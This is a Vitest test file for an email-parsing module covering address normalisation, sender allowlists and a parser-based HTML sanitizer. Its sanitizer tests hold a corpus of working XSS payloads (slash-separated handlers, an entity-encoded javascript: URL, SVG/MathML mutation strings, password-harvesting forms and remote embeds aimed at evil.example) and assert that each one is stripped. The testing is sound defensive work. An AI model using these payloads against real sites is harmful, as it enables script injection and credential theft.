import { describe, expect, it } from 'vitest';
import { JSDOM } from 'jsdom';
import {
  domainOf,
  matchSender,
  normalizeAddress,
  normalizeAllowlistValue,
  sanitizeHtml,
  senderMatchesAllowlist,
} from './email-parse';

describe('email-parse (pure helpers)', () => {
  describe('normalizeAddress', () => {
    it('lower-cases and strips display name + angle brackets', () => {
      expect(normalizeAddress('Ana Kova <Ana@Adriatic-Foods.HR>')).toBe('ana@adriatic-foods.hr');
      expect(normalizeAddress('  bob@example.com ')).toBe('bob@example.com');
    });
    it('rejects malformed addresses', () => {
      expect(normalizeAddress('')).toBeNull();
      expect(normalizeAddress(null)).toBeNull();
      expect(normalizeAddress('no-at-sign')).toBeNull();
      expect(normalizeAddress('two@@ats.com')).toBeNull();
      expect(normalizeAddress('a b@c.com')).toBeNull();
      expect(normalizeAddress('trailing@')).toBeNull();
    });
  });

  it('domainOf returns the domain half', () => {
    expect(domainOf('ana@adriatic-foods.hr')).toBe('adriatic-foods.hr');
    expect(domainOf('nonsense')).toBeNull();
  });

  describe('normalizeAllowlistValue', () => {
    it('normalizes address entries like an address', () => {
      expect(normalizeAllowlistValue('address', 'Ana@Adriatic-Foods.HR')).toBe(
        'ana@adriatic-foods.hr',
      );
      expect(normalizeAllowlistValue('address', 'not-an-address')).toBeNull();
    });
    it('normalizes domain entries: strips @, lower-cases, requires a dot', () => {
      expect(normalizeAllowlistValue('domain', '@Adriatic-Foods.HR')).toBe('adriatic-foods.hr');
      expect(normalizeAllowlistValue('domain', 'adriatic-foods.hr')).toBe('adriatic-foods.hr');
      expect(normalizeAllowlistValue('domain', 'localhost')).toBeNull();
      expect(normalizeAllowlistValue('domain', 'a@b.com')).toBeNull();
    });
  });

  describe('matchSender', () => {
    it('prefers the verified envelope sender, falls back to header From', () => {
      expect(matchSender('envelope@x.com', 'header@y.com')).toBe('envelope@x.com');
      expect(matchSender(null, 'header@y.com')).toBe('header@y.com');
      expect(matchSender('', 'header@y.com')).toBe('header@y.com');
      expect(matchSender(null, null)).toBeNull();
    });
  });

  describe('senderMatchesAllowlist', () => {
    const entries = [
      { kind: 'address' as const, value: 'ana@adriatic-foods.hr' },
      { kind: 'domain' as const, value: 'trusted.example' },
    ];
    it('matches an exact address entry', () => {
      expect(senderMatchesAllowlist('ana@adriatic-foods.hr', entries)).toBe(true);
      expect(senderMatchesAllowlist('ANA@Adriatic-Foods.HR', entries)).toBe(true);
    });
    it('matches any address in a domain entry', () => {
      expect(senderMatchesAllowlist('anyone@trusted.example', entries)).toBe(true);
    });
    it('does not match subdomains implicitly', () => {
      expect(senderMatchesAllowlist('x@sub.trusted.example', entries)).toBe(false);
    });
    it('refuses unknown senders and empty allowlists (closed by default)', () => {
      expect(senderMatchesAllowlist('stranger@example.net', entries)).toBe(false);
      expect(senderMatchesAllowlist('ana@adriatic-foods.hr', [])).toBe(false);
      expect(senderMatchesAllowlist(null, entries)).toBe(false);
    });
  });

  /**
   * Assertions on sanitizer output are made against the PARSE TREE, not the
   * bytes — which is the whole lesson of SEC-7. `<img src="x/onerror=alert(1)">`
   * contains the text "onerror=" and is completely inert; a string match would
   * call that a failure and a `/`-separated real handler a pass.
   */
  const parsedAttributes = (html: string): string[] => {
    const { window } = new JSDOM(`<body>${html}</body>`);
    return [...window.document.body.querySelectorAll('*')].flatMap((el) =>
      [...el.attributes].map((a) => a.name.toLowerCase()),
    );
  };
  const parsedUrls = (html: string): string[] => {
    const { window } = new JSDOM(`<body>${html}</body>`);
    return [...window.document.body.querySelectorAll('[href],[src]')].flatMap((el) =>
      ['href', 'src'].map((n) => el.getAttribute(n) ?? '').filter(Boolean),
    );
  };
  const parsedTags = (html: string): string[] => {
    const { window } = new JSDOM(`<body>${html}</body>`);
    return [...window.document.body.querySelectorAll('*')].map((el) => el.tagName.toLowerCase());
  };

  /**
   * The parser-based sanitizer (security audit 2.0 SEC-7). The old
   * implementation was five regexes and the audit demonstrated two working
   * bypasses; both have their own named case below, and the regex path is gone
   * rather than patched.
   */
  describe('sanitizeHtml', () => {
    it('drops script/style/iframe and inline handlers and js: urls', () => {
      const dirty =
        '<p onclick="steal()">Hi</p><script>evil()</script>' +
        '<style>b{}</style><a href="javascript:alert(1)">x</a>' +
        '<iframe src="http://evil"></iframe>';
      const clean = sanitizeHtml(dirty) ?? '';
      expect(clean).toContain('<p');
      expect(clean).toContain('Hi');
      expect(clean.toLowerCase()).not.toContain('<script');
      expect(clean.toLowerCase()).not.toContain('<style');
      expect(clean.toLowerCase()).not.toContain('<iframe');
      expect(clean.toLowerCase()).not.toContain('onclick');
      expect(clean.toLowerCase()).not.toContain('javascript:');
    });

    it('SEC-7 bypass 1: a slash-separated handler no longer survives', () => {
      // The old handler strip required WHITESPACE before `on`; HTML's
      // before-attribute-name state accepts `/` as a separator just as
      // happily, so these passed straight through the regex and reached the
      // DOM as a live `onerror` attribute in the owner's session.
      for (const payload of [
        '<img/onerror=alert(1) src=x>',
        '<img/src=x/onerror=alert(1)>',
        '<img src=x/onerror=alert(1)>',
        '<img//onerror=alert(1)>',
      ]) {
        // No handler ATTRIBUTE, whatever separator was used to write it.
        expect(parsedAttributes(sanitizeHtml(payload) ?? ''), payload).not.toContain('onerror');
      }
      // And ordinary images still render.
      expect(sanitizeHtml('<img src="cid:x" alt="a">')).toContain('<img');
    });

    it('SEC-7 bypass 2: an entity-encoded javascript: URL no longer survives', () => {
      // The old neutralizer matched the LITERAL scheme; the browser decodes
      // `&#99;` to `c` afterwards, so this reached the DOM as javascript:.
      // The assertion is on the DECODED url the browser would navigate to.
      const clean = sanitizeHtml('<a href="javas&#99;ript:alert(1)">x</a>') ?? '';
      expect(parsedUrls(clean)).toEqual([]);
      expect(clean).toContain('x'); // the text stays; only the URL is dropped
    });

    it('hostile corpus: nothing executable, navigable or embeddable survives', () => {
      const payloads = [
        // Foreign content (SVG/MathML) — different parsing rules, the classic
        // mutation-XSS carrier.
        '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
        '<svg><script>alert(1)</script></svg>',
        '<math><mtext><table><mglyph><style><!--</style><img title="--><img src=1 onerror=alert(1)>">',
        // Scheme smuggling: leading whitespace/control chars, uppercase, data:.
        '<a href=" javascript:alert(1)">y</a>',
        '<a href="JaVaScRiPt:alert(1)">y</a>',
        '<a href="\u0001javascript:alert(1)">y</a>',
        '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">d</a>',
        '<img src="vbscript:msgbox(1)">',
        // Script in CSS.
        '<div style="background:url(javascript:alert(1))">z</div>',
        '<div style="width:expression(alert(1))">z</div>',
        // Navigation and credential harvesting.
        '<form action="https://evil.example"><input name="password"></form>',
        '<base href="https://evil.example/">',
        '<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>',
        '<object data="https://evil.example/x.swf"></object>',
        '<embed src="https://evil.example/x.swf">',
        '<link rel="stylesheet" href="https://evil.example/x.css">',
        '<meta http-equiv="refresh" content="0;url=https://evil.example">',
        // Handler smuggling variants.
        '<body onload=alert(1)>',
        '<img src=x onerror="alert(1)">',
        "<img src=x ONERROR='alert(1)'>",
        '<a href="#" onmouseover=alert(1)>hover</a>',
      ];
      const forbiddenTags = [
        'script',
        'svg',
        'math',
        'form',
        'input',
        'iframe',
        'object',
        'embed',
        'link',
        'meta',
        'base',
        'style',
      ];
      for (const payload of payloads) {
        const clean = sanitizeHtml(payload) ?? '';
        // Nothing that executes, navigates or embeds is in the parse tree …
        for (const tag of forbiddenTags) {
          expect(parsedTags(clean), `${payload} kept <${tag}>`).not.toContain(tag);
        }
        // … no event handler survives under any spelling …
        for (const attribute of parsedAttributes(clean)) {
          expect(attribute.startsWith('on'), `${payload} kept ${attribute}`).toBe(false);
        }
        // … no URL resolves to a scripting scheme …
        for (const url of parsedUrls(clean)) {
          // The URL parser ignores exactly these leading characters, so the
          // assertion must too.
          // eslint-disable-next-line no-control-regex
          expect(url.replace(/[\u0000-\u0020]/g, '').toLowerCase(), payload).not.toMatch(
            /^(javascript|vbscript|data|file|blob):/,
          );
        }
        // … and no script-in-CSS is left in an inline style.
        expect(clean.toLowerCase(), payload).not.toMatch(
          /style="[^"]*(javascript:|vbscript:|expression\()/,
        );
      }
    });

    it('a realistic message still renders: formatting, links, inline images, quoted chains, tables', () => {
      // The counterpart obligation: a sanitizer that mangles ordinary mail is
      // not an acceptable fix. This is what a normal thread actually contains.
      const realistic =
        '<div dir="ltr"><p>Hi Ivan,</p>' +
        '<p>Here is the <b>revised</b> plan with the <i>Q3</i> numbers ' +
        '(<a href="https://example.com/plan">full deck</a>):</p>' +
        '<ul><li>Item one</li><li>Item two</li></ul>' +
        '<table border="1" cellpadding="4"><thead><tr><th>Region</th><th>Q3</th></tr></thead>' +
        '<tbody><tr><td>HR</td><td style="text-align:right">120k</td></tr></tbody></table>' +
        '<p><img src="cid:logo-9f2a" alt="Adriatic Foods" width="120"></p>' +
        '<blockquote style="border-left:1px solid #ccc;padding-left:8px">' +
        'On Mon, 27 Jul 2026, Ana wrote:<br>Can you confirm the volumes?' +
        '</blockquote>' +
        '<div>--<br>Ana Kovač<br>Adriatic Foods</div></div>';
      const clean = sanitizeHtml(realistic) ?? '';
      expect(clean).toContain('Hi Ivan');
      expect(clean).toContain('<b>revised</b>');
      expect(clean).toContain('<ul>');
      expect(clean).toContain('<table');
      expect(clean).toContain('<thead>');
      expect(clean).toContain('href="https://example.com/plan"');
      expect(clean).toContain('src="cid:logo-9f2a"'); // inline image reference kept
      expect(clean).toContain('alt="Adriatic Foods"');
      expect(clean).toContain('<blockquote');
      expect(clean).toContain('Can you confirm the volumes?');
      expect(clean).toContain('Ana Kovač');
      // Layout-bearing inline styles survive; only script-in-CSS is dropped.
      expect(clean).toContain('text-align:right');
    });

    it('returns null for empty input', () => {
      expect(sanitizeHtml(null)).toBeNull();
      expect(sanitizeHtml('')).toBeNull();
    });
  });

  // Quoted-history / signature / forwarded isolation moved to ingestion's
  // `isolateEmailContent` (email-preprocess.spec.ts) — it is an extraction
  // concern shared with the golden-set harness.
});
